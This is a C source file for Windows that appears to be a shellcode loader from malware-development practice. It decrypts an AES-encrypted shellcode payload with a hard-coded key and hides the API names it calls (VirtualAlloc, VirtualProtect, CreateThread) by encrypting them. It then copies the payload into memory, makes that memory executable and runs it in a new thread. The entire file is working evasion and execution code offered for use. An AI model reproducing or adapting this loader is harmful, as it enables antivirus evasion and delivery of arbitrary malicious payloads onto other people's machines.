#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

// Calls
typedef BOOL(WINAPI* pCloseHandle)(HANDLE hObject);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD  lpThreadId);

// Shellcode
unsigned char s_pay[] = { 0xa2, 0xcd, 0x78, 0xc6, 0x61, 0x75, 0xbf, 0x8b, 0x27, 0xf6, 0xb1, 0xcb, 0xd2, 0x32, 0x71, 0xf5, 0x75, 0xfc, 0xa1, 0x3e, 0xc7, 0xdf, 0x1a, 0xd8, 0x36, 0x18, 0x18, 0x71, 0x98, 0x48, 0x1a, 0x30, 0x40, 0xef, 0x39, 0xc6, 0x1c, 0xf1, 0x5b, 0xdd, 0xae, 0x36, 0x32, 0xec, 0xb9, 0xf2, 0x7b, 0xff, 0xa1, 0x68, 0x87, 0xee, 0xa5, 0xb3, 0x53, 0x22, 0x93, 0xab, 0x5d, 0xc9, 0x8b, 0x2, 0x19, 0x67, 0x8b, 0x94, 0xe6, 0x6a, 0xa5, 0x30, 0xa2, 0x4a, 0xad, 0x2e, 0xd9, 0xd0, 0xb8, 0xc7, 0xb4, 0x16, 0x7e, 0x9b, 0x35, 0xe1, 0x3b, 0xa6, 0xe1, 0xee, 0xa8, 0x40, 0x68, 0x7b, 0x9f, 0xc3, 0x8c, 0xd5, 0x99, 0xd3, 0x73, 0x1f, 0xe8, 0x4b, 0x50, 0x56, 0xf5, 0xe7, 0xb1, 0x61, 0xb8, 0x49, 0x12, 0x9b, 0xc3, 0x1a, 0x43, 0xa4, 0x6e, 0xae, 0x11, 0x6f, 0x23, 0x47, 0xe, 0xee, 0x68, 0x21, 0x10, 0x9f, 0x2f, 0xa5, 0x4, 0x1e, 0x54, 0x9d, 0xc3, 0xf5, 0xe1, 0x46, 0x4c, 0x4b, 0x8e, 0x58, 0x3e, 0xb4, 0x96, 0x34, 0xee, 0xe1, 0x49, 0x9b, 0x81, 0x81, 0x78, 0x1c, 0x25, 0xbc, 0x31, 0xd0, 0x4e, 0xc5, 0x35, 0xe1, 0x15, 0x6f, 0x26, 0x8b, 0x26, 0x84, 0x3e, 0x1d, 0x3b, 0x4f, 0xb4, 0x19, 0x9a, 0x18, 0x5a, 0x75, 0x5a, 0x79, 0x26, 0xa0, 0x7, 0x1f, 0x20, 0xdb, 0x57, 0xe1, 0xd9, 0x26, 0x54, 0xf1, 0x6e, 0x97, 0x4f, 0xc0, 0x50, 0x79, 0xc3, 0x75, 0x10, 0x8b, 0x34, 0x4b, 0x36, 0x6, 0xae, 0xb4, 0x8c, 0x3a, 0x99, 0x97, 0x29, 0x1e, 0x42, 0x23, 0x39, 0xc6, 0x37, 0x1d, 0x10, 0x4b, 0xa0, 0x7e, 0xbb, 0x84, 0x87, 0x6b, 0x1a, 0x88, 0xd, 0x10, 0x9b, 0x35, 0x57, 0x81, 0xa9, 0x25, 0x2b, 0x27, 0x7d, 0x8c, 0x88, 0x2, 0xa1, 0xbe, 0x58, 0xf6, 0xf0, 0x90, 0x27, 0x5f, 0x5e, 0x4d, 0xf1, 0x38, 0x33, 0x97, 0x2a, 0x7b, 0xca, 0xcd, 0xd1, 0x6e, 0x1, 0xff, 0x1b, 0xfd, 0x87, 0x2, 0x10, 0x33, 0xe6, 0x42, 0x1, 0x1b, 0x37, 0xde, 0xe7, 0x36, 0xbd, 0x68, 0x32, 0x38, 0x4, 0x3c, 0xb8, 0x5d };
unsigned int s_len = sizeof(s_pay);

// A3S_K
char a3s_k[] = { 0x4d, 0x79, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x4b, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35 };

// AES function
int A3S(char* ciphertext, unsigned int ciphertext_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)ciphertext, (DWORD*)&ciphertext_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


int main(void) {

    BOOL rv;
    HANDLE th;
    void* exec_mem;
    DWORD oldprotect = 0;

    //Function names encrypted
    unsigned char sCloseHandle[] = { 0x14, 0x3e, 0x3f, 0x70, 0x80, 0x9e, 0x57, 0xe7, 0x86, 0xdd, 0xf6, 0x9c, 0x32, 0x95, 0x03, 0x57 };
    unsigned char sRtlMoveMemory[] = { 0xe1, 0xf0, 0x97, 0xae, 0xd4, 0x9d, 0x3d, 0x6d, 0xa1, 0x65, 0x39, 0xdb, 0xd4, 0x4a, 0xa6, 0xd4 };
    unsigned char sVirtualAlloc[] = { 0xc3, 0x23, 0xc4, 0xb8, 0xc3, 0x10, 0xbd, 0x6c, 0x76, 0x3a, 0x2c, 0x67, 0x0d, 0x82, 0xc6, 0x94 };
    unsigned char sVirtualProtect[] = { 0x20, 0xf0, 0xa6, 0xa1, 0xa1, 0xc4, 0xd7, 0x97, 0x06, 0x14, 0xd4, 0x81, 0x55, 0x1b, 0x42, 0xb8 };
    unsigned char sCreateThread[] = { 0x4f, 0x61, 0xd3, 0x43, 0x93, 0x43, 0xb6, 0x06, 0xc9, 0x90, 0x67, 0x9c, 0x83, 0xf8, 0xf5, 0x89 };
    unsigned char sWaitForSingleObject[] = { 0xbf, 0x5c, 0xd6, 0xc2, 0x37, 0x36, 0x80, 0x70, 0x7f, 0x33, 0xe9, 0x7c, 0x72, 0x2b, 0x27, 0xe5, 0x1c, 0x33, 0xf1, 0xfd, 0x0f, 0x15, 0x14, 0x11, 0x23, 0xdf, 0xee, 0x81, 0x63, 0x2b, 0xa4, 0x98 };

    // Decrypt WinFunc
    A3S((char*)sCloseHandle, sizeof(sCloseHandle), a3s_k, sizeof(a3s_k));
    A3S((char*)sRtlMoveMemory, sizeof(sRtlMoveMemory), a3s_k, sizeof(a3s_k));
    A3S((char*)sVirtualAlloc, sizeof(sVirtualAlloc), a3s_k, sizeof(a3s_k));
    A3S((char*)sVirtualProtect, sizeof(sVirtualProtect), a3s_k, sizeof(a3s_k));
    A3S((char*)sCreateThread, sizeof(sCreateThread), a3s_k, sizeof(a3s_k));
    A3S((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), a3s_k, sizeof(a3s_k));

    // Calls
    pCloseHandle fnCloseHandle = (pCloseHandle)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCloseHandle);
    pRtlMoveMemory fnRtlMoveMemory = (pRtlMoveMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sRtlMoveMemory);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualAlloc);
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualProtect);
    pCreateThread fnCreateThread = (pCreateThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCreateThread);
    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sWaitForSingleObject);

    // Allocate new memory buffer for payload
    exec_mem = fnVirtualAlloc(0, s_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void*)s_pay);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

    printf("\nHit me 1st!\n");
    getchar();

    // Decrypt (fX0R) s_pay
    A3S((char*)s_pay, s_len, a3s_k, sizeof(a3s_k));

    // Copy payload to memory
    fnRtlMoveMemory(exec_mem, s_pay, s_len);

    // Make the buffer executable
    rv = fnVirtualProtect(exec_mem, s_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me 2nd!\n");
    getchar();

    //Execute
    if (rv != 0) {
        th = fnCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        fnWaitForSingleObject(th, -1);
    }

    return 0;
}

